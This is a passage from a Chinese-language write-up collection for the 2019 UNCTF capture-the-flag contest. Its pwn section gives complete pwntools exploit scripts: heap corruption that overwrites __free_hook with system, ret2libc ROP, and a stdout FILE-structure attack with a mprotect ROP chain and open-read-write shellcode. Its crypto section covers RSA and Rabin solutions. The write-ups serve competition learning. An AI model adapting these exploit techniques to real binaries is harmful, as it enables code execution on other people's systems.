	payload = p64(0) + p64(0x68) + p64(0) + p64(heap_base + 0x2b0) + p64(0)
	payload += p64(0x101) + p64(0) + p32(0x221) + "\n"
	add(1,payload)
	for i in range(48):
		down(1)
	for i in range(3):
		up1(1)
	for i in range(3):
		up2(1)
	up1(1)
	free(0)
	payload = ''
	payload += p64(0) + p64(0x220) + p64(0) + p64(heap_base + 0x270)
	payload += p32(0x220)
	add(1,payload)
	show()
	main_arena = u64(sh.recvuntil("\x7f")[-6:].ljust(8,'\x00')) - 88
	libc = main_arena - 0x10 - lib.symbols['__malloc_hook']
	__free_hook = libc + lib.symbols['__free_hook']
	system = libc + lib.symbols['system']
	free(0)
	payload = ''
	payload += p64(0) * 2 + p64(0x220) + p64(heap_base + 0x2e0) + p32(0x220) + "\n"
	add(1,payload)
	add(3,'aaa\n')
	free(1)
	free(0)
	payload = ''
	payload += p64(0) * 2 + p64(0x220) + p64(heap_base + 0x2e0) + p64(0x220) + p64(0x231) + p64(main_arena + 88) + p64(heap_base)
	payload += '\n'
	add(1,payload)
	add(3,p64(0))
	free(0)
	payload = ''
	payload += '/bin/sh\x00'*2 + p64(0x220) + p64(__free_hook) + p32(0)
	payload += '\n'
	add(1,payload)
	getlicense(1,p64(system))
	free(0)
	log.success("main_arena: " + hex(main_arena))
	log.success("heap_base: " + hex(heap_base))
	log.success("__free_hook: " + hex(__free_hook))
	log.success("libc: " + hex(libc))
	log.success("system: " + hex(system))
	#gdb.attach(sh)
	sh.interactive()
if __name__ == "__main__":
	pwn("127.0.0.1",9999,1)
```

![](https://ctfwp.wetolink.com/2019unctf/Driver/2.png)

本地测试拿到shell

### easy_pwn
#### 原理知识
1）	通过sprintf 造成溢出
#### 解题过程
1）运行程序，初步测试功能

1）	导入IDA分析，发现有个 sprintf函数这个函数会
在输入一定长度的name 后造成溢出 覆盖到 stack上面的 size 位 从而知道一个溢出这也我们就能rop 溢出泄露拿权限

脚本如下：
```
from pwn import *
context.log_level = 'debug'

exe = './pwn'
libc = 'libc.so.6'

#p = process(exe)
p = remote('127.0.0.1',10000)
elf = ELF(exe)
lib = ELF('x86_libc.so.6')

def d(s=''):
	gdb.attach(p, s)

main = 0x804858B

p.recvuntil('id:')
p.sendline('10')
p.recvuntil('your name:')
p.sendline('BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBaaaa')

payload = 'A'*0x18+'bbbb'+p32(elf.plt['puts'])+p32(main)+p32(elf.got['puts'])
p.recvuntil('me?\n')
p.sendline(payload)

p.recvuntil('mean!\n')
puts_addr = u32(p.recv(4))
libc_base = puts_addr - lib.sym['puts']
success('libc_base--->'+hex(libc_base))

p.recvuntil('id:')
p.sendline('10')
p.recvuntil('your name:')
p.sendline('BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBaaaa')

system = libc_base + lib.sym['system']
binsh = libc_base + lib.search("/bin/sh\x00").next()
payload = 'A'*0x18+'bbbb'+p32(system)+p32(main)+p32(binsh)
p.recvuntil('me?\n')
p.sendline(payload)


p.interactive()
```


### Hermes
#### 原理知识
Gets函数是不安全的函数，会导致栈溢出，通过覆盖返回地址可以跳转到sys函数中。
#### 解题过程
1）打开浏览器，下载程序

2）用IDAx64打开程序

3）查看到name函数中有溢出点，sys函数中有shell

![](https://ctfwp.wetolink.com/2019unctf/Hermes/1.png)![](https://ctfwp.wetolink.com/2019unctf/Hermes/2.png)

4）编写脚本，完成栈溢出的利用

### orwHeap
#### 原理知识
1）通过libc控制泄露pie，然后将__free_hook覆盖为printf，从而泄露stack地址，通过修改chunk_list为栈地址绕过canary 
#### 解题过程
1）看到prctl，所以不能直接拿shell，需要执行orw_shellcode，或者orw_ropchainedit 功能看到off by one，可以unlink 堆块重叠，中间可以重叠两个 0xe8 和 0x68，然后free 0xe8的堆块，bk出现main_arena，这个时候用edit大堆块覆盖bk低位 2个字节，可以在global_max_fast写入大数，这里是十六分之一的概率，然后所有的堆块都是fastbin了，用0xf0大小的堆块通过fastbin attack修改stdout，从而溢出libc leak，然后再修改 stdout实现environ leak，得到一个指针，然后再通过stdout泄露得到的指针减去0x30的地址的数据，得到pie，知道pie之后，由于stdin、stdout、stderr和chunk_list十分贴近通过fastbin attack，即可修改chunk_list。修改某一个堆块指针为__free_hook，从而可以在__free_hook写入printf，然后同时free一个堆块内容为%p的堆块，从而实现stack leak，知道stack_addr，之后将chunk_list的某一个堆块指针覆盖为main函数返回时的地址，就可以写ropchain。先调用mprotect 给 bss段设置成可读可写可执行，然后再区段末尾放入orw_shellcode，然后跳过去执行shellcode 即可拿到flag。 

2)exp如下 
```
#!/usr/bin/python2.7   

# -*- coding: utf-8 -*- 

from pwn import * 

context.log_level = "debug" 

context.arch = "amd64" 

elf = ELF("pwn") 

sh = 0 

lib = 0 

getFlag = 0 

def add(size,content): 


 sh.sendlineafter("Your Choice: ","1") 

 sh.sendlineafter("size: ",str(size)) 

 sh.sendlineafter("content: ",content) 

def free(idx): 

 sh.sendlineafter("Your Choice: ","2") 

 sh.sendlineafter(":",str(idx)) 

def edit(idx,content): 

 sh.sendlineafter("Your Choice: ","3") 

 sh.sendlineafter("Please input idx: ",str(idx)) 

 sh.sendafter("Please input content: ",content) 

def pwn(ip,port,debug): 

 global sh 

 global lib 


 global getFlag 

 if(debug == 1): 

 sh = process("./pwn") 

 lib = ELF("/lib/x86_64-linux-gnu/libc.so.6") 

 else: 

 sh = remote(ip,port) 

 lib = ELF("x64_libc.so.6") 

 global_max_fast = (lib.symbols['__free_hook'] % 0x10000) + (0x7ffff7dd37f8 - 

0x7ffff7dd37a8) 

 stderr_attack = (lib.symbols['_IO_2_1_stdout_'] % 0x10000) - (0x2620 - 0x25cf) 

 pie_offset = lib.symbols['environ'] 

 if(debug == 1): 

 global_max_fast = 0x37f8 


 stderr_attack = 0x25cf 

 #init chunk 

 add(0xf8,"\x11" * 0xf7)#0 

 add(0xe8,"\x11" * 0xe7)#1 

 add(0x68,"\x11" * 0x67)#2 

 add(0xf8,"\x11" * 0xf7)#3 

 payload = '%10$p' 

 add(0x68,payload)#4 

 

 #unlink 

 free(2) 

 free(0) 

 payload = '\x12' * 0x60 + p64(0x260) 


 add(0x68,payload) 

 free(3) 

 payload = '\x13' * 0xf0 + p64(0) + p64(0xf1) 

 payload += '\x14' * 0xe0 + p64(0) + p64(0x71) 

 payload += '\x15' * 0x60 + p64(0) + p64(0xf1) 

 payload += '\x16' * 0xe0 + p64(0) 

 add(0x360 - 0x8,payload) 

 

 #global_max_fast attack 

 free(1) 

 payload = '\x17' * 0xf0 + p64(0) + p64(0xf1) 

 payload += p64(0) + p16(global_max_fast- 0x10) 

 edit(2,payload) 


 #gdb.attach(sh) 

 add(0xe8,'\x18' * 0xe7) 

 

 #IO_FILE 

 #libc leak 

 free(1) 

 payload = '\x17' * 0xf0 + p64(0) + p64(0xf1) + p16(stderr_attack) 

 edit(2,payload) 

 add(0xe8,"\x1a" * 0xe7) 

 payload = '\x00' + p64(0) * 8 

 payload += p64(0xfbad1800) + p64(0) * 3 

 add(0xe8,payload) 

 payload = p64(0xfbad1800) + p64(0) * 3 


 sh.recvuntil(payload) 

 stdout = u64(sh.recv(8)) + 0x20 

 libc = stdout - lib.symbols['_IO_2_1_stdout_'] 

 __malloc_hook = libc + lib.symbols['__malloc_hook'] 

 __free_hook = libc + lib.symbols['__free_hook'] 

 

 #IO_FILE 

 #pie leak 

 payload = '\x00' + p64(0) * 8 

 payload += p64(0xfbad1800) + p64(0) * 3 + p64(libc + pie_offset) + p64(libc + 

pie_offset + 8) + p32((libc + pie_offset + 8) % 0x100000000) + p16((libc + pie_offset + 

8) >> 32) 

 edit(3,payload) 


 environ = u64(sh.recv(8)) 

 text_addr = environ - 0x30 

 payload = '\x00' + p64(0) * 8 

 payload += p64(0xfbad1800) + p64(0) * 3 + p64(text_addr) + p64(text_addr + 8) + 

p32((text_addr + 8) % 0x100000000) + p16((text_addr + 8) >> 32) 

 edit(3,payload) 

 pie = u64(sh.recv(8)) & 0xfffffffffffff000 

 

 #control chunk_list 

 free(0) 

 payload = '\x13' * 0xf0 + p64(0) + p64(0xf1) 

 payload += '\x14' * 0xe0 + p64(0) + p64(0x71) 

 payload += p64(pie + elf.symbols['stderr'] -3) 


 edit(2,payload) 

 add(0x68,"\x15" * 0x67) 

 payload = '\x00' * 3 + p64(0) * 2 

 payload += p64(pie + elf.symbols['stderr'] + 0x20) + p64(__free_hook) 

 add(0x68,payload) 

 

 #leak stack 

 payload = p64(libc + lib.symbols['printf']) 

 edit(1,payload) 

 free(4) 

 sh.recvuntil("0x") 

 ebp = int(sh.recvuntil("Done!",True),16) 

 ret_addr = ebp + (0xe468 - 0xe540) 


 

 #ROPchain 

 payload = p64(pie + elf.symbols['stderr'] + 0x20) + p64(ret_addr) 

 edit(0,payload) 

 payload = p64(lib.search(asm("pop rdx\nret\n")).next() + libc) 

 payload += p64(0x7) 

 payload += p64(lib.search(asm("pop rdi\nret\n")).next() + libc) 

 payload += p64((pie + elf.bss()) & 0xfffffffffffff000) 

 payload += p64(lib.search(asm("pop rsi\nret\n")).next() + libc) 

 payload += p64(0x2000) 

 payload += p64(libc + lib.symbols['mprotect']) 

 payload += p64(lib.search(asm("pop rdi\nret\n")).next() + libc) 

 payload += p64(((pie + elf.bss()) & 0xfffffffffffff000) + 0x800) 


 payload += p64(libc + lib.symbols['gets']) 

 payload += p64(((pie + elf.bss()) & 0xfffffffffffff000) + 0x800) 

 edit(1,payload) 

 sh.sendlineafter("Your Choice:","4") 

 getFlag = 1 

 

 #orw_shellcode 

 payload = shellcraft.amd64.open("./flag") 

 payload += shellcraft.amd64.read(3,pie + elf.bss(),0x30) 

 payload += shellcraft.amd64.write(1,pie + elf.bss(),0x30) 

 sh.sendline(asm(payload)) 

 log.success("ret_addr: " + hex(ret_addr)) 

 log.success("ebp: " + hex(ebp)) 


 log.success("pie: " + hex(pie)) 

 log.success("environ: " + hex(environ)) 

 sh.interactive() 

if __name__ == "__main__": 

 global sh 

 while(True): 

 try: 

 if(getFlag == 0): 

 pwn("127.0.0.1",9090,0) 

 else: 

 sh.close() 

 break; 

 except EOFError: 


 sh.close() 

 if(getFlag != 0): 

 break 

 continue 
```
3）运行结果如下：
![](https://ctfwp.wetolink.com/2019unctf/orwHeap/0e525cb7f1b75b185d46a620e8153013.png)

### Sosoeasypwn
#### 原理知识
函数指针的认识，和对pie 保护的认识。然后我们能绕过 pie
#### 解题过程
1）打开浏览器，下载程序

2）用IDA打开程序

3）发现第二个函数

![](https://ctfwp.wetolink.com/2019unctf/Sosoeasypwn/1.png)

没有溢出但是 答应了一个函数的前几位地址

然后是没有溢出的输入

![](https://ctfwp.wetolink.com/2019unctf/Sosoeasypwn/2.png)

第三个函数 接受我们的输入 然后复制函数指针。

但是如果我们 输入的是 1,2 以外的 数 v1 就不会得到函数指针而是用 stack 上的值

我们就可以 通过第二个函数布置

但是 开启pie 我们只能得到 addr 的前2字节 我们发现有后面函数就能爆破半字节从而

调用后门函数得到shell

4）编写脚本，完成函数指针的利用和pie的绕过。

## Crypto
### BabyRsa
#### 原理知识
1）	对两素数乘积N进行因式分解。

2）	根据欧拉 公式计算出私钥d，进行解密。

### ECC和AES基础
#### 原理知识
1）	公钥密码，解决了密钥分配问题，安全性大大提高。同时，公钥密码的加、解密需要付出的成本更高，速度更慢。适用于短信息加密

2）	对称密码，密钥分配问题难以解决。但其拥有良好的加密性能与加密效率，适用于大文件加密。

3）	现在，市场上的加密机制多采用公钥密码与私钥密码组合加密的模式。即，使用公钥密码加密密钥，使用对称密码加密信息

4）	ECC基于椭圆曲线，离散对数难解问题。对其攻击方法，现有BSGS（小步大步法）、Pohlig-Hellman法（相当有效）等
#### 解题过程
1.  下载压缩包，记事本打开阅读加密算法，如下图

![](https://ctfwp.wetolink.com/2019unctf/ecc_aes/38f4074ee48cf23c15025fbecc9603c6.png)

2）题目，首先用ECC加密aes的密钥，然后用aes加密明文

1.  首先，通过解开ecc的私钥k（注意区分大小k、K），继而求得aes密钥。如图，这里使用的是sage，用python也可。

![](https://ctfwp.wetolink.com/2019unctf/ecc_aes/8c7d6c8b52d51ad29a2ebe5a8f7c83b9.png)

1.  得到aes_key后，解密密文，即可得到flag，如下图

![](https://ctfwp.wetolink.com/2019unctf/ecc_aes/250b257e1c516ed711c338a2fc1b1264.png)

### 不仅仅是RSA
#### 原理知识
1）	由于两组加密p相同可以很容易求出q，得到突破口

2）摩斯音频转换需要找到合适方法
#### 解题过程
1.  下载附件，得到5个文件

![](https://ctfwp.wetolink.com/2019unctf/not_only_rsa/1df58de813d2b97e2dbb98c05b4a7a11.png)

2）首先分析RSA.py

![](https://ctfwp.wetolink.com/2019unctf/not_only_rsa/10eb9015db9e14a639378ac333862540.png)

分析得到：

n1=p1*q

n2=p2*q

∴模不互素 （gcd(n1,n2)!=1）

∴gcd(n1,n2)=q

3）根据pem文件得到两个公钥

![](https://ctfwp.wetolink.com/2019unctf/not_only_rsa/f0088e307ec5a07f308365a841a0848d.png)

1.  根据wav文件得到密文c

![](https://ctfwp.wetolink.com/2019unctf/not_only_rsa/3c03f826455633a1e878cd4339ca52b7.png)

![](https://ctfwp.wetolink.com/2019unctf/not_only_rsa/2da2789fb0c9dac16104cbe5efc8dd23.png)

1.  编写解密脚本，运行即可获得flag

![](https://ctfwp.wetolink.com/2019unctf/not_only_rsa/14125a4f7d3859f379f30bd0fc8d25eb.png)

![](https://ctfwp.wetolink.com/2019unctf/not_only_rsa/4c82f3e8358ce84f5bfd0d02216ec9b8.png)

### 一句话加密
#### 原理知识
1）	e=2是Rabin算法，而不是RSA由于两组加密p相同可以很容易求出q，得到突破口

2）	遇到不熟悉密码是快速搜索能力
#### 解题过程
1.  下载附件，得到2个文件

![](https://ctfwp.wetolink.com/2019unctf/encrypt_shell/62c27498e18b668526fba466027967dc.png)

2）首先分析encode.py,果然如题目，是一句话加密

![](https://ctfwp.wetolink.com/2019unctf/encrypt_shell/3d5842c0542081adbd6ab398fc455ff7.png)

分析大概应该是rsa之类的，得找到公钥（n,e）

1.  分析e.jpg

    ![](https://ctfwp.wetolink.com/2019unctf/encrypt_shell/ac4bb5e413f43f78011bf7ae8b222ba0.png)

不知道什么密码

1.  用HxD打开，看到最后有一段16进制数，猜测是n,还提示了个kobe

![](https://ctfwp.wetolink.com/2019unctf/encrypt_shell/9961fb2bce9e2edafa5c7a4ddb745b8a.png)

5）百度搜索kobe 发现kobe code 这个密码会出现的科比的球鞋上

![](https://ctfwp.wetolink.com/2019unctf/encrypt_shell/527cfe2870e0402f04d0425b3d479d1f.png)

解密e 得到e=2

6)e=2,那说明是RSA的衍生算法Rabin了，根据已经得到的数据，推理出完整的加密算法

![](https://ctfwp.wetolink.com/2019unctf/encrypt_shell/856e40c2c1107a3fd131fa1dee1fbd17.png)

7）分解n,并写解密exp

```
#-*-coding:utf-8 -*-
import gmpy2
import libnum
c=62501276588435548378091741866858001847904773180843384150570636252430662080263
#c2 = 72510845991687063707663748783701000040760576923237697638580153046559809128516
p = 275127860351348928173285174381581152299
q = 319576316814478949870590164193048041239

n = p*q
u = pow(c,(p+1)/4,p)
v = pow(c,(q+1)/4,q)
#   sp+tq=1  
s = gmpy2.invert(p,q)   # (p^-1) mod q 
t = gmpy2.invert(q,p)   # (q^-1) mod p
x = (t*q*u+s*p*v)%n
y = (t*q*u-s*p*v)%n

print (libnum.n2s(x%n))
print (libnum.n2s((-x)%n))
print (libnum.n2s(y%n))
print (libnum.n2s((-y)%n))
```

![](https://ctfwp.wetolink.com/2019unctf/encrypt_shell/1b606212f95987c3ff3241be639ac0cb.png)

8）修改c,两次运行脚本拼接得到flag

![](https://ctfwp.wetolink.com/2019unctf/encrypt_shell/2bb67e42b284877184fad59bb9531c59.png)

![](https://ctfwp.wetolink.com/2019unctf/encrypt_shell/b5d52673182db918676e420690f178e2.png)

# 评论区